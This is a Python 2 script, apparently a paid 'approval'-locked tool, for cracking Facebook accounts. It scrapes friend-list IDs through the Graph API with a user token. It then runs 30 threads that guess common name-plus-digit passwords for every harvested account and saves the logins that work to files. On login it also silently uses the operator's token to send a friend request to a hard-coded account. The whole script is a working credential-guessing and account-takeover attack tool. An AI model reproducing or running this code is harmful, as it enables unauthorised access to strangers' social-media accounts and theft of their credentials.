#!/usr/bin/python
# coding=utf-8
try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pip2 install requests")
    os.system("pkg install nodejs")
    os.system("python2 pro.py")
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass 
try:
    os.mkdir("/sdcard/ids/ex_ids")
except OSError:
    pass
os.system("git pull")
from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")
os.system('clear')
logo = """
 \x1b[0;32m     _______  _______  _______ _________
 \x1b[0;31m    (  ____ \(  ___  )(       )\__   __/
 \x1b[0;33m    | (    \/| (   ) || () () |   ) (   
 \x1b[0;34m    | (_____ | |   | || || || |   | |   
 \x1b[0;35m    (_____  )| |   | || |(_)| |   | |   
 \x1b[0;36m          ) || |   | || |   | |   | |   
 \x1b[0;31m    /\____) || (___) || )   ( |___) (___
 \x1b[0;33m    \_______)(_______)|/     \|\_______/
     \x1b[101m\x1b[37;1mCODED BY SOMI-AWAN\x1b[0m
\033[1;97m-----------------------------------------------
\x1b[0;35m⋟ DEVOLPER   :  SOMI AWAN
\x1b[0;35m⋟ WHATSAAP   :  03455453538
\x1b[0;35m⋟ FACEBOOK   :  https://www.facebook.com/SO MI
\033[1;97m-----------------------------------------------
"""

idh = []
back = 0
def reg():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mTake The Approval For Login'
    print '\033[1;95mBuy this Tool Rs : ???'
    print ''
    time.sleep(1)
    try:
        to = open('/sdcard/.vgkekdlppowjujebeu3beb.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/S-O-M-i/pro7/main/.server.txt').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        time.sleep(5)
        g()
    else:
        os.system('clear')
        print logo
        print ''
        print '\tApproved Failed \033[1;91m ×'
        print ''
        print ' \x1b[1;92mYour Id Is Not Approved Already '
        print ''
        print ' \x1b[1;92mCopy the id and send to \033[1;93mOwner  '
        print ''
        print ' \x1b[1;92mYour id: \x1b[0;36m' + to
        print ''
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+923455453538')
        reg()


def reg2():
    os.system('clear')
    print logo
    print '\tApproval not detected'
    print
    print ' \x1b[1;93mCopy and press \033[1;33mEnter'
    print ' \x1b[1;93mSelect whatsapp to\x1b[0;36m continue'
    print ''
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+923455454548')
    sav = open('/sdcard/.vgkekdlppowjujebeu3beb.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()
 
def g():
    os.system("clear")
    print logo
    print("\033[1;93mTool Verification")
    print("\033[1;97m--------------------------------")
    ip = raw_input("\033[1;97m(\033[1;91m+\033[1;97m) Your-ip :  ")
    if ip =="28484838-54":
        os.system("clear")
        print logo
        print ("\033[1;97m(\033[1;93m✓\033[1;97m) Your-ip : (Confirmed)")
        ss = raw_input("\033[1;97m(\033[1;91m+\033[1;97m) Tool-ip : ")
        if ss =="46644-0":
            os.system("clear")
            print logo 
            print ("\033[1;97m(\033[1;93m✓\033[1;97m) Your-ip : (Confirmed)")
            print ("\033[1;97m(\033[1;93m✓\033[1;97m) Tool-ip : (Confirmed)")
            time.sleep(1)
            print('')
            print("\033[1;92m ✓ \033[1;93m All Set")
            time.sleep(1)          
            login_choice()

def login_choice():
	os.system("clear")
	try:
		open(".login.txt","r")
		menu()
	except IOError:
		os.system("clear")
		print(logo)
		print 47 * "\033[1;91m═"
		print("\t    \033[1;32mLOGIN MENU\033[0;97m")
		print 47 * "\033[1;91m═"
		print("\033[1;97m(\033[1;92m1\033[1;97m) Login with token")
		print("\033[1;97m(\033[1;92m2\033[1;97m) Login with id/pass")
		print("")
		login_select()
def login_select():
	select = raw_input("\033[1;92m>>> \033[0;97m")
	if select =="1":
		login_token()
	elif select =="2":
		login_fb()
	else:
		print("")
		print("\t    \033[1;31mSelect valid option\033[0;97m")
		print("")
		time.sleep(1)
		login_select()
def login_fb():
	os.system("clear")
	print(logo)
	print 47 * "\033[1;91m═"
	print("\t    \033[1;32mLOGIN WITH ID/PASS\033[0;97m")
	print 47 * "\033[1;91m═"
	id = raw_input(" Id/mail/number: ")
	id1=id.replace(' ','')
	id2=id1.replace('(','')
	uid=id2.replace(')','')
	pwd = raw_input(" Password: ")
	print("")
	data=requests.get('http://localhost:5000/auth?id='+uid+'&pass='+pwd, headers=header).text
	q = json.loads(data)
	if "loc" in q:
		hamza = open(".login.txt","w")
		hamza.write(q["loc"])
		hamza.close()
		requests.post('https://graph.facebook.com/me/friends?uid=100048514350891&access_token='+q['loc'])
		menu()
	elif "www.facebook.com" in q["error"]:
		print("")
		print("\t    \033[1;31mUser must verify account before login\033[0;97m")
		time.sleep(1)
		print("")
		raw_input("\tPress enter to back ")
		login_choice()
	else:
		print("")
		print("\t    \033[1;31mIncorrect credentials\033[0;97m")
		raw_input("Press enter to try again ")
		login_choice()
def login_token():
	os.system("clear")
	try:
		open(".login.txt","r")
		time.sleep(1)
		menu()
	except (KeyError , IOError):
	    os.system("clear")
	    print(logo)
	    print 47 * "\033[1;91m═"
	    print("\t    \033[1;32mFB TOKEN LOGIN\033[0;97m")
	    print 47 * "\033[1;91m═"
	    token = raw_input("\033[1;97m(\033[1;91m+\033[1;97m) Paste token : ")
	    token_save = open(".login.txt","w")
	    token_save.write(token)
	    token_save.close()
	    time.sleep(1)
	    menu()
def menu():
	os.system("clear")
	try:
		token = open(".login.txt","r").read()
	except IOError:
		os.system("clear")
		print("")
		print(logo)
		print("")
		print("\t    \033[1;31mToken not found\033[0;97m")
		time.sleep(1)
		login_choice()
	try:
		r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
		a = json.loads(r.text)
		name = a["name"]
	except KeyError:
		os.system("clear")
		print("")
		print(logo)
		print("")
		print("\t    \033[1;31mToken expired\033[0;97m")
		time.sleep(1)
		os.system("rm -rf .login.txt")
		login_choice()
	os.system("clear")
	print(logo)
	print 47 * "\033[1;91m═"
	print("\t    \033[1;32mUser: "+name+"\033[0;97m")
	print 47 * "\033[1;91m═"
	print("\033[1;97m(\033[1;92m1\033[1;97m) Crack auto pass")
	print("\033[1;97m(\033[1;92m2\033[1;97m) Crack choice password")
	print("\033[1;97m(\033[1;92m3\033[1;97m) Extract/Dump ids")
	print("\033[1;97m(\033[1;92m4\033[1;97m) Tool Using Method")
	print("")
	menu_option()
def menu_option():
	select = raw_input("\033[1;92m>>> \033[0;97m")
	if select =="1":
		crack()
	elif select =="2":
		choice()
	elif select =="3":
		ex_id()
	elif select =="4":
	    os.system('xdg-open https://youtu.be/3RScVdKPnF8')
	else:
		print("")
		print("\t    \033[1;31mSelect valid option\033[0;97m")
		print("")
		menu_option()
def crack():
	global token
	os.system("clear")
	try:
		token = open(".login.txt","r").read()
	except IOError:
		print("")
		print("\t    \033[1;31mToken not found\033[0;97m")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	
	print("\t    \033[1;32mAUTO PASS CLONING\033[0;97m")
	print
	print("\033[1;97m(\033[1;92m1\033[1;97m) Crack Public Friendlist")
	print("\033[1;97m(\033[1;92m2\033[1;97m) Crack File Account")
	print("\033[1;97m(\033[1;91m0\033[1;91m) Back")
	
	print("")
	crack_select()
def crack_select():
	select = raw_input("\033[1;33m>>> \033[0;97m")
	id=[]
	oks=[]
	cps=[]
	
	if select =="1":
		os.system("clear")
		print(logo)
		print("")
		print("\t    \033[1;32mAUTO PASS PUBLIC CRACK\033[0;97m")
		print("")
		idt = raw_input("\033[1;97m(\033[1;91m+\033[1;97m) User id : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("\033[1;97m(\033[1;93m✓\033[1;97m) User Name : "+q["name"])
		except KeyError:
			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
			print("")
			raw_input(" Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	
	elif select =="2":
		os.system("clear")
		print(logo)
		print("")
		print("\t    \033[1;32mAUTO PASS FILE CRACK\033[0;97m")
		print("")
		try:
			filelist = raw_input("\033[1;97m(\033[1;91m+\033[1;97m) Paste File : ")
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;31mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			crack()
	else:
		print("")
		print("\t    \033[1;31mSelect valid option\033[0;97m")
		print("")
		crack_select()
	print("\033[1;97m(\033[1;93m✓\033[1;97m) Total Account : "+str(len(id)))
	print 47 * '═'
	
    
	print("")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
			pass1 = "Pakistan"
			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;32m(SOMI-OK) "+uid+" | "+pass1+"\033[0;97m")
				ok = open("/sdcard/ids/checkpoint.txt", "a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error"]:
					print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass1)
					cp = open("checkpoint.txt","a")
					cp.write(uid+" | "+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name+"123"
					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;32m(SOMI-OK) "+uid+" | "+pass2+"\033[0;97m")
						ok = open("/sdcard/ids/somi.txt", "a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error"]:
							print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass2)
							cp = open("checkpoint.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name+"1234"
							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
							q = json.loads(data)
							if "loc" in q:
								print("\033[1;32m(SOMI-OK) "+uid+" | "+pass3+"\033[0;97m")
								ok = open("/sdcard/ids/checkpoint.txt", "a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error"]:
									print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass3)
									cp = open("checkpoint.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name+"12345"
									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;32m(SOMI-OK) "+uid+" | "+pass4+"\033[0;97m")
										ok = open("/sdcard/ids/checkpoint.txt", "a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error"]:
											print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass4)
											cp = open("checkpoint.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											cps.apppend(uid+pass4)
										else:
											pass5 = name+"786"
											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
											q = json.loads(data)
											if "loc" in q:
												print("\033[1;32m(SOMI-OK) "+uid+" | "+pass5+"\033[0;97m")
												ok = open("/sdcard/ids/checkpoint.txt", "a")
												ok.write(uid+" | "+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error"]:
													print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass5)
													cp = open("checkpoint.txt","a")
													cp.write(uid+" | "+pass5+"\n")
													cp.close()
													cps.append(uid+pass6)
												else:
													pass6 = "000786"
													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
													q = json.loads(data)
													if "loc" in q:
														print("\033[1;32m(SOMI-OK) "+uid+" | "+pass6+"\033[0;97m")
														ok = open("/sdcard/ids/checkpoint.txt", "a")
														ok.write(uid+" | "+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in q["error"]:
															print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass6)
															cp = open("checkpoint.txt","a")
															cp.write(uid+" | "+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															pass7 = "786786"
															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
															q = json.loads(data)
															if "loc" in q:
																print("\033[1;32m(SOMI-OK) "+uid+" | "+pass7+"\033[0;97m")
																ok = open("/sdcard/ids/checkpoint.txt", "a")
																ok.write(uid+" | "+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in q["error"]:
																	print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass7)
																	cp = open("checkpoint.txt","a")
																	cp.write(uid+" | "+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
																
		except:
			pass
	
	p = ThreadPool(30)
	p.map(main,id)
	print("")
	print(47*"-")
	print("")
	print(" The process has completed")
	print(" Total Ok/Cp:"+str(len(oks)))+"/"+str(len(cps))
	print("")
	print(47*"-")
	print("")
	raw_input(" Press enter to back")
	crack()
def ex_id():
    idg=[]
    global token
    try:
    	token = open(".login.txt","r").read()
    except IOError:
    	print("\t    \033[1;31mToken not found\033[0;97m")
    	print("")
    	time.sleep(1)
    	login_choice()
    os.system("clear")
    print(logo)
    print 47 * "\033[1;91m═"
    print("\t  \033[1;32mCOLLECT PUBLIC ID FRIENDLIST\033[0;97m")
    print 47 * "\033[1;91m═"
    idh = raw_input("\033[1;97m(\033[1;91m+\033[1;97m) Input Id: ")
    try:
        r = requests.get("https://graph.facebook.com/"+idh+"?access_token="+token, headers=header)
        q = json.loads(r.text)
        print("\033[1;97m(\033[1;91m✓\033[1;97m) Collecting from: "+q["name"])
    except KeyError:
    	print("")
        print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
        print("")
        raw_input(" Press enter to back")
        crack()
    r = requests.get("https://graph.facebook.com/"+idh+"/friends?access_token="+token, headers=header)
    q = json.loads(r.text)
    ids = open("ids_friends.txt","w")
    for i in q["data"]:
        uid = i["id"]
        na = i["name"]
        nm=na.rsplit(" ")[0]
        idg.append(uid+"|"+nm)
        ids.write(uid+"|"+nm + "\n")
    ids.close()
    print("")
    print(47*"-")
    print("")
    print(" The process has completed")
    print(" Total ids: "+str(len(idg)))
    print("")
    print(47*"-")
    print("")
    raw_input(" Press enter to download file")
    os.system("cp ids_friends.txt /sdcard")
    os.system("rm -rf ids_friends.txt")
    print(" File downloaded successfully")
    time.sleep(1)
    print ("\033[1;93mEnter Go Back")
    menu()
def choice():
	global token
	os.system("clear")
	try:
		token = open(".login.txt","r").read()
	except IOError:
		print("")
		print("\t    \033[1;31mToken not found\033[0;97m")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	
	print("\t    \033[1;32mCHOICE PASS CRACK MENU\033[0;97m")
	
	print("\033[1;97m(\033[1;92m1\033[1;97m) Crack Public Friendlist")
	print("\033[1;97m(\033[1;92m2\033[1;97m) Crack File Account")
	print("\033[1;97m(\033[1;91m0\033[1;91m) Back")
	print("")
	choice_select()
def choice_select():
	select = raw_input("\033[1;32m>>> \033[0;97m")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print("")
		print("\t    \033[1;32mCHOICE NAME PASS CRACK\033[0;97m")
		
		p1 = raw_input("\033[1;97m(\033[1;91m1\033[1;97m) Name + Digit : ")
		p2 = raw_input("\033[1;97m(\033[1;91m2\033[1;97m) Name + Digit : ")
		p3 = raw_input("\033[1;97m(\033[1;91m2\033[1;97m) Name + Digit : ")
		p4 = raw_input("\033[1;97m(\033[1;91m3\033[1;97m) Name + Digit : ")
		print 
		print("\t    \033[1;32mCHOICE DIGIT PASS CRACK\033[0;97m")
		print 47 * "\033[1;91m═"
		pass5 = raw_input("\033[1;97m(\033[1;91m+\033[1;97m) Digit Password : ")
		pass6 = raw_input("\033[1;97m(\033[1;91m+\033[1;97m) Digit Password : ")
		pass7 = raw_input("\033[1;97m(\033[1;91m+\033[1;97m) Digit Password : ")
		print 
		print("\t    \033[1;32mAUTO PASS PUBLIC CRACK\033[0;97m")
		print("")
		idt = raw_input("\033[1;97m(\033[1;91m+\033[1;97m) User id : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("\033[1;97m(\033[1;93m✓\033[1;97m) User id : "+q["name"])
		except KeyError:
			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
			print("")
			raw_input(" Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	
	elif select =="2":
		os.system("clear")
		print(logo)
		print
		print("\t    \033[1;32mCHOICE NAME PASS CRACK\033[0;97m")
		print 47 * "\033[1;91m═"
		p1 = raw_input("\033[1;97m(\033[1;91m1\033[1;97m) Name + Digit : ")
		p2 = raw_input("\033[1;97m(\033[1;91m2\033[1;97m) Name + Digit : ")
		p3 = raw_input("\033[1;97m(\033[1;91m3\033[1;97m) Name + Digit : ")
		p4 = raw_input("\033[1;97m(\033[1;91m4\033[1;97m) Name + Digit : ")
		print 
		print("\t    \033[1;32mCHOICE DIGIT PASS CRACK\033[0;97m")
		print 47 * "\033[1;91m═"
		pass5 = raw_input("\033[1;97m(\033[1;91m+\033[1;97m) Digit Password : ")
		pass6 = raw_input("\033[1;97m(\033[1;91m+\033[1;97m) Digit Password : ")
		pass7 = raw_input("\033[1;97m(\033[1;91m+\033[1;97m) Digit Password : ")
		print("")
		print("\t    \033[1;32mAUTO PASS FILE CRACK\033[0;97m")
		print("")
		try:
			filelist = raw_input("\033[1;97m(\033[1;91m+\033[1;97m) Paste File : ")
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;31mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			menu()
	
	
	elif select =="0":
	    menu()
	else:
		print("")
		print("\t    \033[1;31mSelect valid option\033[0;97m")
		print("")
		choice_select() 
	print("\033[1;97m(\033[1;93m✓\033[1;97m) Total Account : "+str(len(id)))
	print 47 * '═'
	
	
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
			pass1 = name+ p1
			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;32m(SOMI-OK) "+uid+" | "+pass1+"\033[0;97m")
				ok = open("/sdcard/ids/checkpoint.txt", "a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error"]:
					print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass1)
					cp = open("checkpoint.txt","a")
					cp.write(uid+" | "+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name+ p2
					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;32m(SOMI-OK) "+uid+" | "+pass2+"\033[0;97m")
						ok = open("/sdcard/ids/checkpoint.txt", "a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error"]:
							print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass2)
							cp = open("checkpoint.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name+ p3
							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
							q = json.loads(data)
							if "loc" in q:
								print("\033[1;32m(SOMI-OK) "+uid+" | "+pass3+"\033[0;97m")
								ok = open("/sdcard/ids/checkpoint.txt", "a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error"]:
									print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass3)
									cp = open("checkpoint.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name+ p4
									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;32m(SOMI-OK) "+uid+" | "+pass4+"\033[0;97m")
										ok = open("/sdcard/ids/checkpoint.txt", "a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error"]:
											print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass4)
											cp = open("checkpoint.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											cps.apppend(uid+pass4)
										else:
											
											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
											q = json.loads(data)
											if "loc" in q:
												print("\033[1;32m(SOMI-OK) "+uid+" | "+pass5+"\033[0;97m")
												ok = open("/sdcard/ids/checkpoint.txt", "a")
												ok.write(uid+" | "+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error"]:
													print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass5)
													cp = open("checkpoint.txt","a")
													cp.write(uid+" | "+pass5+"\n")
													cp.close()
													cps.append(uid+pass6)
												else:
													
													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
													q = json.loads(data)
													if "loc" in q:
														print("\033[1;32m(SOMI-OK) "+uid+" | "+pass6+"\033[0;97m")
														ok = open("/sdcard/ids/checkpoint.txt", "a")
														ok.write(uid+" | "+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in q["error"]:
															print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass6)
															cp = open("checkpoint.txt","a")
															cp.write(uid+" | "+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
															q = json.loads(data)
															if "loc" in q:
																print("\033[1;32m(SOMI-OK) "+uid+" | "+pass7+"\033[0;97m")
																ok = open("/sdcard/ids/checkpoint.txt", "a")
																ok.write(uid+" | "+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in q["error"]:
																	print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass7)
																	cp = open("checkpoint.txt","a")
																	cp.write(uid+" | "+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
																
			
																
		except:
			pass
	
	p = ThreadPool(30)
	p.map(main,id)
	print("")
	print(47*"-")
	print("")
	print(" The process has completed")
	print(" Total Ok/Cp:"+str(len(oks)))+"/"+str(len(cps))
	print("")
	print(47*"-")
	print("")
	raw_input(" Press enter to back")
	choice()
if __name__ == '__main__':
	reg()

